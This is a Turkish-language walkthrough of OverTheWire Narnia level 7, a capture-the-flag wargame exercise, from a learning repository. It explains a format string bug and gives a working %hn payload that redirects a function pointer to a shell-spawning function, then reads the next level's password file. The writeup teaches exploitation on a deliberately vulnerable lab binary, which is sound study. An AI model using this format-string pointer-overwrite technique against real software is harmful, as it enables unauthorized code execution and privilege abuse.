# 💥 OverTheWire Narnia — Level 7 → Level 8
## Format String → Fonksiyon Pointer'ını `hackedfunction`'a Çevirmek

> narnia5'teki format string yazma tekniğini, narnia6'daki "fonksiyon
> pointer'ı ele geçir" fikriyle birleştiriyoruz. Program bir pointer'ı
> (`ptrf`) `goodfunction`'a ayarlıyor ve çağırıyor. Biz `%hn` ile o pointer'ı
> **`hackedfunction`'a** (içinde `system("/bin/sh")` olan) çevireceğiz. Bu
> level'ın püf noktası: **byte yazma sırası.**

| | |
|---|---|
| **Bağlantı** | `ssh narnia7@narnia.labs.overthewire.org -p 2226` |
| **Kaynak** | `/narnia/narnia7.c` · binary: `/narnia/narnia7` |
| **Kavram** | Format string (`%hn`) → fonksiyon pointer üzerine adres yazma |
| **Zorluk** | ⭐⭐⭐⭐⭐ |

**Bu level için gereken konular:**
- [`05_format_string.md`](../../konu_anlatimlari/binary_exploitation/05_format_string.md) — `%n`/`%hn`, sayaç mantığı (önce bunu oku!)
- [`06_return_to_libc_ve_fonksiyon_pointer.md`](../../konu_anlatimlari/binary_exploitation/06_return_to_libc_ve_fonksiyon_pointer.md) — fonksiyon pointer kavramı
- Önce [`narnia_5-6.md`](./narnia_5-6.md) — format string yazmayı orada öğrendik

---

## 🎯 Hedef

`ptrf` adlı fonksiyon pointer `goodfunction`'ı gösteriyor ve `snprintf`'ten sonra `return ptrf()` ile çağrılıyor. Format string açığını kullanıp `ptrf`'in değerini `hackedfunction`'ın adresiyle değiştireceğiz — böylece `ptrf()` çağrısı bize shell verecek.

---

## 📖 Kaynak Kod

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
    char buffer[128];
    int (*ptrf)();

    memset(buffer, 0, sizeof(buffer));
    printf("goodfunction() = %p\n", goodfunction);       // ← HEDİYE: goodfunction adresi
    printf("hackedfunction() = %p\n\n", hackedfunction); // ← HEDİYE: hackedfunction adresi (hedefimiz)

    ptrf = goodfunction;
    printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);  // ← HEDİYE: ptrf'in DEĞERİ ve ADRESİ (&ptrf)

    printf("I guess you want to come to the hackedfunction...\n");
    sleep(2);
    ptrf = goodfunction;

    snprintf(buffer, sizeof buffer, format);             // ← AÇIK: format string kontrolü sende

    return ptrf();                                       // ptrf'i hackedfunction yaparsak → shell
}

int main(int argc, char **argv){
    if (argc <= 1){
        fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
        exit(-1);
    }
    exit(vuln(argv[1]));
}

int goodfunction(){
    printf("Welcome to the goodfunction, but i said the Hackedfunction.\n");
    fflush(stdout);
    exit(0);
}

int hackedfunction(){
    printf("Way to go!!!!\n");        // ← başarı mesajı (aşağıdaki çıktıda göreceğin satır)
    setreuid(geteuid(), geteuid());   // yetkiyi koru
    system("/bin/sh");                // ← ödül
    return 0;
}
```

---

## 🔍 Kaynak Kodu Analizi — Açık ve Hediyeler

**Açık:** Yine `snprintf(buffer, size, format)` — `format` = `argv[1]`, yani format string'i biz kontrol ediyoruz (narnia5'teki gibi).

**Hedef:** `ptrf` fonksiyon pointer'ı. `goodfunction`'ı gösteriyor, `snprintf`'ten **hemen sonra** `return ptrf()` ile çağrılıyor. `ptrf`'i `hackedfunction`'a çevirirsek shell alırız.

**Program bize üç adresi hediye ediyor** (bu yüzden hiçbirini tahmin etmiyoruz):
- `goodfunction()` adresi
- `hackedfunction()` adresi ← **yazacağımız değer**
- `before : ptrf() = <değer> (<&ptrf>)` ← parantezdeki `&ptrf` = **yazacağımız adres**

> ⚠️ Bu adresler sunucu yeniden derlendikçe değişir (eski writeup'larda `0x80486e0`/`0x8048706`, yeni sürümde başka). **Her zaman programın o anki çıktısından oku.** Aşağıdaki örnekte `hackedfunction = 0x08048706`, `&ptrf = 0xffffd61c` kullanıyorum.

---

## 📚 Gereken Teori: `%hn` ile Pointer Üzerine Yazma

narnia5'te `%n` (4 byte) ile bir `int`'e yazmıştık. Burada bir **adres** (4 byte) yazıyoruz ama tek seferde 4 byte yazmak için sayacı ~`0x08048706` = 134 milyon yapmamız gerekirdi (imkansız/çok yavaş). Çözüm: adresi **iki 16-bit yarıya** bölüp her birini ayrı `%hn` ile yazmak.

- `%hn` → **2 byte** (16-bit, `short`) yazar. Sayaç sadece **artar**.
- Bir 4-byte adresi iki `%hn` ile yazarız: biri **düşük yarı**, biri **yüksek yarı**.

**Kritik: sayaç sadece arttığı için ÖNCE küçük değeri yazmalısın.**

> 💡 **Kısayol (bu binary'de işe yarar):** `goodfunction` (`0x080486e0`) ile `hackedfunction` (`0x08048706`) **aynı yüksek yarıya** sahip (`0x0804`). `ptrf` zaten `goodfunction`'ı gösterdiği için yüksek yarısı **zaten `0x0804`**. O yüzden teorik olarak sadece **düşük yarıyı** (`0x8706`) tek bir `%hn` ile yazman yeter. Aşağıda yine de **genel** (iki yazmalı) yöntemi anlatıyorum — yüksek yarılar farklı olsaydı bu gerekirdi ve tekniği tam öğretir.

---

## 🧪 Adım Adım

### Adım 1 — Adresleri oku ve format offset'ini bul

```bash
narnia7@narnia:/narnia$ ./narnia7 'AAAA%x.%x.%x.%x.%x.%x.%x.'
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706                       # ← yazacağımız değer
before : ptrf() = 0x80486e0 (0xffffd61c)           # ← yazacağımız adres = 0xffffd61c
I guess you want to come to the hackedfunction...
... AAAA....41414141.                              # 41414141 kaçıncı %x'te? → offset
```

`41414141` ("AAAA") **6.** `%x`'te çıkarsa → **offset = 6**. (Kendi binary'inde doğrula; kimi derlemede farklı olabilir.)

### Adım 2 — Değerleri ve yarıları hesapla

```
Hedef değer (hackedfunction) = 0x08048706
Yazılacak adres (&ptrf)      = 0xffffd61c

İki 16-bit yarı:
  HOB (yüksek yarı) = 0x0804 = 2052   → adresin YÜKSEK yarısına (addr+2)
  LOB (düşük yarı)  = 0x8706 = 34566  → adresin DÜŞÜK yarısına (addr)

Little-endian: 0x08048706 bellekte → 06 87 04 08
  → düşük yarı (0x8706) DÜŞÜK adrese (addr = 0xffffd61c)
  → yüksek yarı (0x0804) YÜKSEK adrese (addr+2 = 0xffffd61e)

Sayaç sadece artar → ÖNCE küçük olanı yaz:
  0x0804 (2052) < 0x8706 (34566)  → önce HOB (0x0804)
  HOB yüksek yarı → addr+2'ye gider → payload'da addr+2 ÖNCE gelir
```

### Adım 3 — Formül

```
[addr+2][addr]                          → 8 byte (iki adres)
%.[HOB - 8]x      = 0x0804 - 8  = 2044  → %.2044x   (sayaç: 8 + 2044 = 2052 = 0x0804)
%[offset]$hn      = %6$hn               → 0x0804'ü addr+2'ye yaz
%.[LOB - HOB]x    = 0x8706 - 0x0804 = 32514 → %.32514x (sayaç: 2052 + 32514 = 34566 = 0x8706)
%[offset+1]$hn    = %7$hn               → 0x8706'yı addr'a yaz

addr+2 = 0xffffd61e → \x1e\xd6\xff\xff
addr   = 0xffffd61c → \x1c\xd6\xff\xff
```

---

## ▶️ Çalıştırma

```bash
narnia7@narnia:/narnia$ ./narnia7 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x1e\xd6\xff\xff\x1c\xd6\xff\xff" + b"%.2044x%6$hn%.32514x%7$hn")')"
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706
before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Way to go!!!!
$ cat /etc/narnia_pass/narnia8
<şifre buraya gelir>
```

`ptrf` artık `hackedfunction`'ı gösteriyor → `ptrf()` = `hackedfunction()` → `system("/bin/sh")`. "Way to go!!!!" gördüysen kazandın. Şifreyi al, narnia8'e geç.

---

## ⚠️ En Kritik Tuzak: Yazma Sırası (çoğu kişi burada hata yapar)

```
DOĞRU sıra:   addr+2 ÖNCE, addr SONRA   →  \x1e... \x1c...
              (önce küçük değer 0x0804 yüksek yarıya, sonra 0x8706 düşük yarıya)

YANLIŞ sıra:  addr ÖNCE, addr+2 SONRA   →  \x1c... \x1e...
              Bu durumda 0x0804 DÜŞÜK adrese, 0x8706 YÜKSEK adrese gider
              → sonuç 0x87060804 olur (hackedfunction DEĞİL!) → ptrf bozulur
```

Sebep: `%hn`'in yazdığı sayaç **sadece artar**, geri gidemez. Bu yüzden iki değerden **küçük olanı önce** yazarsın. Küçük olan (`0x0804`) adresin **yüksek yarısına** (`addr+2`) ait olduğu için, payload'da `addr+2`'yi öne koyarsın.

---

## ⚠️ Diğer Yaygın Hatalar

**1. Adresleri tahmin etmek.** Gerek yok — program `goodfunction`, `hackedfunction` ve `&ptrf`'i **basıyor**. Çıktıdan oku.

**2. Adreslerin sabit olduğunu sanmak.** Sunucu sürümüne göre değişir; her çalıştırmada basılan değerleri kullan.

**3. Offset'i sabit varsaymak.** `41414141` kaçıncı `%x`'te çıkıyorsa offset o (burada 6); binary'e göre değişir. `%offset$hn` ve `%(offset+1)$hn` ona göre.

**4. `%n` kullanmak (`%hn` yerine).** `%n` 4 byte yazar; biz 2'şer byte yazıyoruz → `%hn`. (`%hhn` ise 1 byte — dört `%hhn` ile byte byte de yazılabilir, alternatif.)

**5. `print()` ile adres byte'ları göndermek.** `\x1e\xd6...` bozulur → `sys.stdout.buffer.write(b"...")`.

> 💡 narnia5'teki iki incelik burada da geçerli: `snprintf` çıktıyı 128 byte'a kırpar ama `%hn`'e giden sayaç tam değeri alır; konumlu `%k$hn` ile konumsuz `%.Nx` karıştırmak teknik olarak UB ama glibc çalıştırır.

---

## ✅ Ne Öğrendik

- Format string açığıyla sadece bir `int` değil, bir **fonksiyon pointer**'ını da ezip program akışını başka bir fonksiyona çevirebiliriz.
- 4-byte bir adresi yazmak için `%hn` ile **iki 16-bit yazma** yaparız (düşük yarı + yüksek yarı).
- `%hn` sayacı **sadece arttığı** için **küçük değeri önce** yazarız; little-endian'da hangi yarının hangi adrese gittiğini düşünüp payload'daki adres sırasını ona göre koyarız.
- Programın bize bastığı adresleri (hedef fonksiyon, hedef pointer) kullanmak, tahmin/ASLR derdini ortadan kaldırır.

Son level (narnia8) format string'i bırakıp ilginç bir **pointer/buffer kendine-referans** açığına dönüyor: bir fonksiyon, kaynak pointer'ı (`blah`) kopyalarken kendi kendini ezecek şekilde tasarlanmış.

---

## ⬅️➡️ Gezinme

- **Önceki:** [Level 6 → Level 7 — Return-to-libc + Fonksiyon Pointer](./narnia_6-7.md)
- **Sonraki:** [Level 8 → Level 9 — Pointer Manipülasyonu](./narnia_8-9.md)

---

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
